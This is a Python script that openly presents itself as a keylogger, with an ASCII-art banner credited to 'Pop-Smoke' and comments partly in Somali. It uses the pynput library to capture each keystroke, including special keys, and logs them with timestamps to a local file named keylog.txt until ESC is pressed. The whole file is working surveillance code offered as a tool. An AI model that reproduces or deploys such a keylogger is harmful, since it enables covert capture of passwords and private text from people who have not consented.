import logging
import os
from pynput import keyboard
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Set up logging
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

# ASCII Art for branding
ascii_art = '''
  _____           _          _____  _      _____                    
 |  __ \         | |        / ____|| |    / ____|                   
 | |__) |_ _ ___| |_ ___  | (___  | |__ | |__ ___  _ __   __ _ ___  
 |  ___/ _` / __| __/ _ \  \___ \ | '_ \|  __/ _ \| '_ \ / _` / __| 
 | |  | (_| \__ \ ||  __/  ____) || | | | | | (_) | | | | (_| \__ \ 
 |_|   \__,_|___/\__\___| |_____/ |_| |_|\___\___/|_| |_|\__,_|___/ 
                                                                     
                                                                     
                        Code by Pop-Smoke                         
'''

# Function to print ASCII Art and clear shell
def print_banner():
    os.system('clear')  # Nadiifi screen-ka marka hore
    print(Fore.GREEN + ascii_art)  # Daabac ASCII art oo leh midab
    print(Fore.YELLOW + Style.BRIGHT + "[INFO] Keylogger is running... Press 'ESC' to stop.")  # Midab iyo qoraal iftiimaya

# Define on_press event
def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        if key == keyboard.Key.space:
            logging.info(' Space ')
        elif key == keyboard.Key.enter:
            logging.info(' Enter ')
        elif key == keyboard.Key.tab:
            logging.info(' Tab ')
        elif key == keyboard.Key.backspace:
            logging.info(' Backspace ')
        elif key == keyboard.Key.shift:
            logging.info(' Shift ')
        elif key == keyboard.Key.ctrl:
            logging.info(' Ctrl ')
        elif key == keyboard.Key.alt:
            logging.info(' Alt ')

# Define on_release event
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        print(Fore.RED + "[INFO] Keylogger stopped.")  # Daabac farriinta joojinta oo leh midab casaan
        return False

# Start keylogger
def start_keylogger():
    print_banner()  # Display the ASCII banner
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Run the keylogger
if __name__ == "__main__":
    start_keylogger()
